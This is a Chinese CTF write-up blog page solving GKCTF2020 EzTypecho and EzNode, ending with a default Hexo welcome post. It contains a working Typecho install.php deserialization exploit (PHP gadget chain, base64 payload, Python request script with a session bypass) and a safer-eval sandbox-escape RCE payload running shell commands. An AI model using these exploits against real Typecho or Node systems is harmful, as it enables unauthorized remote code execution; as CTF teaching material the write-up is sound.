-<h1 id="GKCTF2020-EZ三剑客-EzTypecho"><a href="#GKCTF2020-EZ三剑客-EzTypecho" class="headerlink" title="[GKCTF2020]EZ三剑客-EzTypecho"></a>[GKCTF2020]EZ三剑客-EzTypecho</h1><h2 id="考点：Typecho反序列化"><a href="#考点：Typecho反序列化" class="headerlink" title="考点：Typecho反序列化"></a>考点：Typecho反序列化</h2><p>这个18，19的省赛都涉及到了，也是个老考点了。不过这道题并不是单传的照搬CVE而是有了一定更改，还是出的很有价值的一道题。</p>
-<h3 id="法1：原exp链-绕过session"><a href="#法1：原exp链-绕过session" class="headerlink" title="法1：原exp链+绕过session"></a>法1：原exp链+绕过session</h3><p>题目直接给了源码，是基于Typecho的一个站</p>
-<p>这个组件最有名的洞就是<code>install.php</code>存在的反序列化getshell：</p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200814130811663.png" alt="image-20200814130811663"></p>
-<p>这篇已经写的非常详细了：审计+复现</p>
-<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/155753.html">https://www.freebuf.com/vuls/155753.html</a></p>
-<p>我们就依葫芦画瓢一下。</p>
-<p>首先要运行到反序列化的部分必须满足两个条件，这个题目中的<code>install.php</code>和复现文章的源码基本一样：</p>
-<p><strong>1.Referer必须是本站</strong></p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200814131358407.png" alt="image-20200814131358407"></p>
-<p><strong>2.$_GET[‘finish’]不为空</strong></p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200814131454306.png" alt="image-20200814131454306"></p>
-<p>之后就可以看到反序列化漏洞点，不过这里相比于原漏洞这里多加了一个条件，必须存在session：</p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200814131555116.png" alt="image-20200814131555116"></p>
-<p>搜一下，<code>session_start()</code>被注释了，真是小机灵鬼。</p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200814133223362.png" alt="image-20200814133223362"></p>
-<p>这个情况很像JarvisOJ里面的一道题phpinfo，涉及到session上传的一个机制。</p>
-<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/session.upload-progress.php">https://www.php.net/manual/zh/session.upload-progress.php</a></p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200814133147043.png" alt="image-20200814133147043"></p>
-<p>同时session.upload_progress.name的默认值为：<strong>PHP_SESSION_UPLOAD_PROGRESS</strong></p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200814142140335.png" alt="image-20200814142140335"></p>
-<p>划重点：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.当一个上传在处理  -----随便向页面上传个文件</span><br><span class="line">2.同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。 ----POST一个PHP_SESSION_UPLOAD_PROGRESS&#x3D;xxxxx即可</span><br><span class="line">3.当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据——————也就是$_SESSION此时就不为空了</span><br></pre></td></tr></table></figure>
-
-<p>OK，下面开始解题。</p>
-<p>首先根据exp脚本生成payload：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$CMD = <span class="string">&#x27;phpinfo()&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">const</span> RSS2 = <span class="string">&#x27;RSS 2.0&#x27;</span>;</span><br><span class="line">        <span class="keyword">const</span> ATOM1 = <span class="string">&#x27;ATOM 1.0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> $_type;</span><br><span class="line">        <span class="keyword">private</span> $_items;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="comment">//$this-&gt;_type = $this::RSS2;</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">$this</span>-&gt;_type = <span class="keyword">$this</span>::ATOM1;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;_items[<span class="number">0</span>] = <span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">&#x27;category&#x27;</span> =&gt; <span class="keyword">array</span>(<span class="keyword">new</span> Typecho_Request()),</span><br><span class="line">                        <span class="string">&#x27;author&#x27;</span> =&gt; <span class="keyword">new</span> Typecho_Request(),</span><br><span class="line">                );</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $_params = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">private</span> $_filter = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;_params[<span class="string">&#x27;screenName&#x27;</span>] = $GLOBALS[CMD];</span><br><span class="line">                <span class="keyword">$this</span>-&gt;_filter[<span class="number">0</span>] = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$exp = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;adapter&#x27;</span> =&gt; <span class="keyword">new</span> Typecho_Feed(),</span><br><span class="line">        <span class="string">&#x27;prefix&#x27;</span>  =&gt; <span class="string">&#x27;typecho_&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($exp));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>那么payload为：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__typecho_config&#x3D;YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6Mjp7czo4OiJjYXRlZ29yeSI7YToxOntpOjA7TzoxNToiVHlwZWNob19SZXF1ZXN0IjoyOntzOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9wYXJhbXMiO2E6MTp7czoxMDoic2NyZWVuTmFtZSI7czo5OiJwaHBpbmZvKCkiO31zOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6NjoiYXNzZXJ0Ijt9fX1zOjY6ImF1dGhvciI7TzoxNToiVHlwZWNob19SZXF1ZXN0IjoyOntzOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9wYXJhbXMiO2E6MTp7czoxMDoic2NyZWVuTmFtZSI7czo5OiJwaHBpbmZvKCkiO31zOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6NjoiYXNzZXJ0Ijt9fX19fXM6NjoicHJlZml4IjtzOjg6InR5cGVjaG9fIjt9</span><br></pre></td></tr></table></figure>
-
-<p>文章中提到，Payload可以通过插入Cookie提交，也可以通过POST提交。</p>
-<p>因为POST我们要提交PHP_SESSION_UPLOAD_PROGRESS。所以这里改用cookie提交。</p>
-<p>此外，别忘了加上Referer头(内容为靶机地址)以及<code>?finish</code>。</p>
-<p>Python脚本如下，我们将回显的结果在本地保存为html页面：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://f905337f-89e3-497a-9a74-a7e00c4a4171.node3.buuoj.cn/install.php?finish=1&quot;</span></span><br><span class="line">files=&#123;<span class="string">&#x27;lcz&#x27;</span>:<span class="string">&quot;nb&quot;</span>&#125;</span><br><span class="line">headers = &#123;<span class="string">&#x27;cookie&#x27;</span>:<span class="string">&#x27;PHPSESSID=hhh;__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6Mjp7czo4OiJjYXRlZ29yeSI7YToxOntpOjA7TzoxNToiVHlwZWNob19SZXF1ZXN0IjoyOntzOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9wYXJhbXMiO2E6MTp7czoxMDoic2NyZWVuTmFtZSI7czo5OiJwaHBpbmZvKCkiO31zOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6NjoiYXNzZXJ0Ijt9fX1zOjY6ImF1dGhvciI7TzoxNToiVHlwZWNob19SZXF1ZXN0IjoyOntzOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9wYXJhbXMiO2E6MTp7czoxMDoic2NyZWVuTmFtZSI7czo5OiJwaHBpbmZvKCkiO31zOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6NjoiYXNzZXJ0Ijt9fX19fXM6NjoicHJlZml4IjtzOjg6InR5cGVjaG9fIjt9&#x27;</span></span><br><span class="line">,<span class="string">&#x27;Referer&#x27;</span>:<span class="string">&#x27;http://f905337f-89e3-497a-9a74-a7e00c4a4171.node3.buuoj.cn/install.php&#x27;</span>&#125;</span><br><span class="line">r =requests.post(url,files=files,headers=headers,data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;hjnb&#x27;</span>&#125;)</span><br><span class="line">print(r.encoding) <span class="comment">#UTF-8</span></span><br><span class="line"><span class="comment">#print(r.text)</span></span><br><span class="line">f = open(<span class="string">&quot;test.html&quot;</span>, <span class="string">&quot;w&quot;</span>,encoding=<span class="string">&quot;UTF-8&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> r.text:</span><br><span class="line">    <span class="comment">#将数据写入文件</span></span><br><span class="line">    f.write(i)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
-
-<p>结果如下，成功执行phpinfo：</p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200814144136556.png" alt="image-20200814144136556"></p>
-<p>接下来替换exp中的命令，将生成的payload替换cookie即可，就不单放了：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system(&#39;ls &#x2F;&#39;);</span><br><span class="line">system(&#39;cat &#x2F;flag&#39;);</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200814144358885.png" alt="image-20200814144358885"></p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200814144541265.png" alt="image-20200814144541265"></p>
-<h3 id="法2：另一处反序列化"><a href="#法2：另一处反序列化" class="headerlink" title="法2：另一处反序列化"></a>法2：另一处反序列化</h3><p>根据该漏洞的分析文章，利用点是在这一句上：</p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200814145036869.png" alt="image-20200814145036869"></p>
-<p>也就是<code>Typecho_Cookie::get(&#39;__typecho_config&#39;))</code>是可以触发的条件。那么全局搜一下，发现在除了原有的触发点，还有一处：</p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200814145202026.png" alt="image-20200814145202026"></p>
-<p>在284行，程序运行到这里的条件是须有GET参start，当然也需要Referer为本站。</p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200814145251445.png" alt="image-20200814145251445"></p>
-<p><strong>除此之外没有任何其他限制条件</strong>。</p>
-<p>那么如法炮制一下，给<code>install.php?start=lcz</code>POST一个包。包头Referer为本站，包的内容为上面生成的payload：</p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200814145639116.png" alt="image-20200814145639116"></p>
-<p>成功抬走：</p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200814145650197.png" alt="image-20200814145650197"></p>
-<p>汗颜……</p>
-<h1 id="GKCTF2020-EZ三剑客-EzNode"><a href="#GKCTF2020-EZ三剑客-EzNode" class="headerlink" title="[GKCTF2020]EZ三剑客-EzNode"></a>[GKCTF2020]EZ三剑客-EzNode</h1><h2 id="考点：settimeout溢出-沙盒逃逸"><a href="#考点：settimeout溢出-沙盒逃逸" class="headerlink" title="考点：settimeout溢出+沙盒逃逸"></a>考点：settimeout溢出+沙盒逃逸</h2><p>一个Nodejs的题目，给了源码和所用库的版本。</p>
-<p>一开始有个注释就很有趣：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> saferEval = <span class="built_in">require</span>(<span class="string">&#x27;safer-eval&#x27;</span>); <span class="comment">// 2019.7/WORKER1 找到一个很棒的库</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br></pre></td></tr></table></figure>
-
-<p>那么根据给出的版本号，搜一下<code>safer-eval</code>这个库：</p>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;src&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;1.0.0&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;main&quot;</span>: <span class="string">&quot;index.js&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;license&quot;</span>: <span class="string">&quot;MIT&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;dependencies&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;body-parser&quot;</span>: <span class="string">&quot;1.19.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;express&quot;</span>: <span class="string">&quot;4.17.1&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;safer-eval&quot;</span>: <span class="string">&quot;1.3.6&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>上snyk查一下，果然有发现：<a target="_blank" rel="noopener" href="https://snyk.io/vuln/search?q=safe-eval&amp;type=any">https://snyk.io/vuln/search?q=safe-eval&amp;type=any</a></p>
-<p>有个全版本通杀的RCE：<a target="_blank" rel="noopener" href="https://snyk.io/vuln/SNYK-JS-SAFEREVAL-534901">https://snyk.io/vuln/SNYK-JS-SAFEREVAL-534901</a></p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200815095936218.png" alt="image-20200815095936218"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const theFunction &#x3D; function () &#123; const f &#x3D; Buffer.prototype.write; const ft &#x3D; &#123; length: 10, utf8Write()&#123; &#125; &#125;; function r(i)&#123; var x &#x3D; 0; try&#123; x &#x3D; r(i); &#125;catch(e)&#123;&#125; if(typeof(x)!&#x3D;&#x3D;&#39;number&#39;) return x; if(x!&#x3D;&#x3D;i) return x+1; try&#123; f.call(ft); &#125;catch(e)&#123; return e; &#125; return null; &#125; var i&#x3D;1; while(1)&#123; try&#123; i&#x3D;r(i).constructor.constructor(&quot;return process&quot;)(); break; &#125;catch(x)&#123; i++; &#125; &#125; return i.mainModule.require(&quot;child_process&quot;).execSync(&quot;id&quot;).toString() &#125;; const untrusted &#x3D; &#96;($&#123;theFunction&#125;)()&#96;; console.log(saferEval(untrusted));</span><br></pre></td></tr></table></figure>
-
-<p>ok，接下来分析源码。</p>
-<p>先来看第一个路由：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 2020.1/WORKER2 老板说为了后期方便优化</span></span><br><span class="line">app.use(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.path === <span class="string">&#x27;/eval&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> delay = <span class="number">60</span> * <span class="number">1000</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(delay);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Number</span>.isInteger(<span class="built_in">parseInt</span>(req.query.delay))) &#123;</span><br><span class="line">      delay = <span class="built_in">Math</span>.max(delay, <span class="built_in">parseInt</span>(req.query.delay));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> t = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> next(), delay);</span><br><span class="line">    <span class="comment">// 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事</span></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">clearTimeout</span>(t);</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">&#x27;timeout&#x27;</span>);</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        res.send(<span class="string">&#x27;Timeout!&#x27;</span>);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    next();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-
-<p>Nodejs cxk水平，简单分析下。</p>
-<p>在<code>/eval</code>这个路由下。首先先设置了delay的默认值。之后接受用户传一个名为delay的参数。传过去的值会和默认值比较，选较大的值设置为delay的值。之后将delay作为超时时限，若超时了就进到下一个路由。</p>
-<p>按正常逻辑来说，这个delay的默认值除非在南极做题要不应该是超时不了的。我们传的delay如果比默认值小也没用。</p>
-<p>那么bypass的话无非是两种思路，一种是传不同数据类型（类似于php中的数组绕过），一种就是让其上溢/下溢（例如php中的intval上下溢出）。</p>
-<p>这里的关键是后者，setTimeout()存在上溢出。</p>
-<p><a target="_blank" rel="noopener" href="https://juejin.im/post/6844903990077947912">https://juejin.im/post/6844903990077947912</a></p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200815104138963.png" alt="image-20200815104138963"></p>
-<p>那么只要传<code>/eval?delay=2147483648</code>就可以直接跳转到<code>next()</code>，执行下一个路由。</p>
-<p>下一个路由就是明示了，调用了<code>saferEval</code>，接受用户传一个名为e的值并作为其参数。这个就用到上面所述的RCE了。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">app.post(&#39;&#x2F;eval&#39;, function (req, res) &#123;</span><br><span class="line">  let response &#x3D; &#39;&#39;;</span><br><span class="line">  if (req.body.e) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">      response &#x3D; saferEval(req.body.e);</span><br><span class="line">    &#125; catch (e) &#123;</span><br><span class="line">      response &#x3D; &#39;Wrong Wrong Wrong!!!!&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  res.send(String(response));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>这里将上面的poc改成IIFE形式（立即调用的函数表达式）来传参，即：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(function () &#123;</span><br><span class="line">    statements</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
-
-<p>那么改一下就是：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">     <span class="keyword">const</span> f = Buffer.prototype.write;</span><br><span class="line">    <span class="keyword">const</span> ft = &#123;</span><br><span class="line">        length: <span class="number">10</span>,</span><br><span class="line">        utf8Write() &#123;&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">r</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> x = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            x = r(i);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(e) &#123;&#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span>(x) !== <span class="string">&#x27;number&#x27;</span>) <span class="keyword">return</span> x;</span><br><span class="line">        <span class="keyword">if</span> (x !== i) <span class="keyword">return</span> x + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f.call(ft);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">            <span class="keyword">return</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> i = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            i = r(i).constructor.constructor(<span class="string">&quot;return process&quot;</span>)();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span>(x) &#123;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> i.mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;id&quot;</span>).toString()</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>
-
-<p>URL编码一下，带上delay传参，可以看到成功命令执行：</p>
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200815110450713.png" alt="image-20200815110450713"></p>
-<p>那么接下来找flag就完事了，把payload的<code>execSync()</code>改为想要执行的命令即可：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls &#x2F;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200815110602828.png" alt="image-20200815110602828"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;flag</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://kee1ongz.oss-cn-beijing.aliyuncs.com/img/image-20200815110640730.png" alt="image-20200815110640730"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://kee1ong.github.io/2020/08/16/gkctf2/" data-id="ckdwz2qkr0000evfyat627nnd" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/GKCTF2020/" rel="tag">GKCTF2020</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/08/16/hello-world/" class="article-date">
-  <time datetime="2020-08-16T09:41:45.164Z" itemprop="datePublished">2020-08-16</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/08/16/hello-world/">Hello World</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
